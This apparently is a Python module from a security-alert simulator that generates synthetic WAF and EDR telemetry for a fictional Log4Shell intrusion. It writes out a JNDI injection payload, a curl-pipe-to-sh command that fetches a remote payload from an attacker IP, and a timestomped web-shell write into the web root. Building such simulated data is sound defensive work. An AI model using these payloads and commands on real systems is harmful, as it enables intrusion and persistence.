"""Campaign B -- SALTWORKS (Hollow Tide): opportunistic Log4Shell exploitation, docs/04 section 3.

The WAF sees a JNDI injection (waf-b001); the EDR sees the statement-render ``java`` process spawn a shell
that curls and pipes a payload (ldt-b002) and drop a web shell into the web root (ldt-b003). The EDR does not
know the family name BRACKISH, so ``.b.jsp`` gets ``verdict: suspicious`` with no ``malware_family`` -- the TI
layer attributes it. No cloud API activity from the stmt-render role yet (the blast radius is *potential*).
"""
from __future__ import annotations

from throughline.simulator import storyline_constants as S
from throughline.simulator.events.ctx import Ctx, add_alert, falcon_raw, involves
from throughline.simulator.events.network import connected_to, ip_node
from throughline.simulator.events.processes import SYS_HASHES, add_process, executed, file_node, spawn

INC_EDGE = "inc-0096"
SVC_USER = "statement-render"
WEBROOT = "/opt/statement-render/webapps/ROOT"


def generate_storyline_b(ctx: Ctx) -> None:
    edge_ep = ctx.inv.endpoint(S.EP_EDGE)
    assert edge_ep, "storyline B requires the stmt-render-2a endpoint in the inventory"
    src_ip = ip_node(ctx, S.SALTWORKS_IP, source="waf-sim", asn="AS64511",
                     asn_org="Brackwater Networks (fictional)", country="RU")

    # --- B1: WAF JNDI injection ----------------------------------------------------------------------
    b1_id, b1_ts, b1_sev = S.ALERT_B["b001"]
    waf_raw = {
        "rule_id": "944130",
        "rule_name": "Remote Command Execution: Log4j / JNDI lookup",
        "action": "alert",
        "http_method": "GET",
        "uri": "/api/statements/render",
        "matched_header": "X-Api-Version",
        "payload": "${jndi:ldap://203.0.113.99:1389/o}",
        "source_ip": S.SALTWORKS_IP,
        "target_host": S.EDGE_HOSTNAME,
        "target_ip": S.EDGE_PUBLIC_IP,
        "target_port": 8080,
        "count": 1,
        "note": "one of ~2,300 exploit-pattern alerts this week (mostly scanner noise)",
    }
    add_alert(ctx, alert_id=b1_id, source_system="waf", alert_type="network",
              title="JNDI injection pattern in request header",
              description="A request to stmt-render-2a:8080 carried a ${jndi:ldap://...} Log4Shell probe in the "
                          "X-Api-Version header.",
              severity=b1_sev, detected_at=b1_ts, techniques=["T1190", "T1595.002"], entity_id=S.EDGE_VM,
              entity_label="VirtualMachine", on_resource=S.EDGE_VM, hostname=S.EDGE_NAME, raw=waf_raw)
    involves(ctx, b1_id, src_ip, "source", source="waf-sim", when=b1_ts)

    # --- B2: java spawns a shell that curls|sh -------------------------------------------------------
    b2_id, b2_ts, b2_sev = S.ALERT_B["b002"]
    java = add_process(ctx, endpoint_id=S.EP_EDGE, pid=2211, image_path="/opt/java/bin/java",
                       command_line="/opt/java/bin/java -jar /opt/statement-render/app.jar --server.port=8080",
                       user=SVC_USER, start_time="2026-09-10T20:00:00Z", sha256=SYS_HASHES["java"],
                       signer="Eclipse Adoptium", integrity_level="medium")
    bash = add_process(ctx, endpoint_id=S.EP_EDGE, pid=2260, image_path="/bin/bash",
                       command_line=f'/bin/bash -c "curl -s {S.BRACKISH_URL} | sh"', user=SVC_USER,
                       start_time=b2_ts, parent_id=java, integrity_level="medium")
    spawn(ctx, java, bash, when=b2_ts)
    curl = add_process(ctx, endpoint_id=S.EP_EDGE, pid=2261, image_path="/usr/bin/curl",
                       command_line=f"curl -s {S.BRACKISH_URL}", user=SVC_USER, start_time=b2_ts, parent_id=bash)
    spawn(ctx, bash, curl, when=b2_ts)
    sh = add_process(ctx, endpoint_id=S.EP_EDGE, pid=2262, image_path="/bin/sh", command_line="sh",
                     user=SVC_USER, start_time=b2_ts, parent_id=bash, sha256=SYS_HASHES["sh"])
    spawn(ctx, bash, sh, when=b2_ts)
    connected_to(ctx, curl, src_ip, port=8000, protocol="http", count=3, bytes_out=4096,
                 first_time=b2_ts, last_time="2026-09-10T21:30:00Z")
    b2_raw = falcon_raw(alert_id=b2_id, endpoint=edge_ep, severity=b2_sev, techniques=["T1190", "T1059.004"],
                        display_name="Shell spawned by Java application server process",
                        description="The statement-render java process spawned /bin/bash to curl and pipe a remote "
                                    "payload to sh.", disposition="detected", filename="bash", filepath="/bin/bash",
                        cmdline=f'/bin/bash -c "curl -s {S.BRACKISH_URL} | sh"', sha256=SYS_HASHES["bash"],
                        user_name=SVC_USER, timestamp=b2_ts, incident_id=INC_EDGE,
                        parent={"process_id": java, "cmdline": "/opt/java/bin/java -jar ...", "filename": "java"})
    b2_raw["remote_address"] = S.SALTWORKS_IP
    add_alert(ctx, alert_id=b2_id, source_system="falcon", alert_type="detection",
              title="Shell spawned by Java application server process",
              description="java (statement-render) spawned a shell to curl|sh a remote payload from 203.0.113.99.",
              severity=b2_sev, detected_at=b2_ts, techniques=["T1190", "T1059.004"], entity_id=S.EP_EDGE,
              entity_label="Endpoint", on_endpoint=S.EP_EDGE, hostname=edge_ep["hostname"], user=SVC_USER,
              vendor_incident_id=INC_EDGE, raw=b2_raw)
    involves(ctx, b2_id, java, "subject", when=b2_ts)
    involves(ctx, b2_id, bash, "subject", when=b2_ts)
    involves(ctx, b2_id, curl, "subject", when=b2_ts)
    involves(ctx, b2_id, src_ip, "destination", when=b2_ts)

    # --- B3: web shell written to the web root -------------------------------------------------------
    b3_id, b3_ts, b3_sev = S.ALERT_B["b003"]
    jsp_path = f"{WEBROOT}/.b.jsp"
    jsp = file_node(ctx, sha256=S.HASH_BRACKISH, file_name=".b.jsp", file_path=jsp_path,
                    verdict="suspicious", size_bytes=3172)
    executed(ctx, sh, jsp, action="wrote", when=b3_ts)
    b3_raw = falcon_raw(alert_id=b3_id, endpoint=edge_ep, severity=b3_sev, techniques=["T1505.003"],
                        display_name="Web shell-like file written to web root",
                        description="A .jsp file was written to the servlet web root and its timestamp blended with "
                                    "neighbouring files (touch -r).", disposition="detected", filename=".b.jsp",
                        filepath=jsp_path, cmdline=f"sh -c 'cat > {jsp_path}; chmod 644 {jsp_path}; touch -r index.jsp {jsp_path}'",
                        sha256=S.HASH_BRACKISH, user_name=SVC_USER, timestamp=b3_ts, incident_id=INC_EDGE,
                        parent={"process_id": sh, "cmdline": "sh", "filename": "sh"})
    add_alert(ctx, alert_id=b3_id, source_system="falcon", alert_type="detection",
              title="Web shell-like file written to web root",
              description="A suspicious .jsp file was written to the statement-render web root (BRACKISH).",
              severity=b3_sev, detected_at=b3_ts, techniques=["T1505.003"], entity_id=S.EP_EDGE,
              entity_label="Endpoint", on_endpoint=S.EP_EDGE, hostname=edge_ep["hostname"], user=SVC_USER,
              vendor_incident_id=INC_EDGE, raw=b3_raw)
    involves(ctx, b3_id, sh, "subject", when=b3_ts)
    involves(ctx, b3_id, jsp, "object", when=b3_ts)
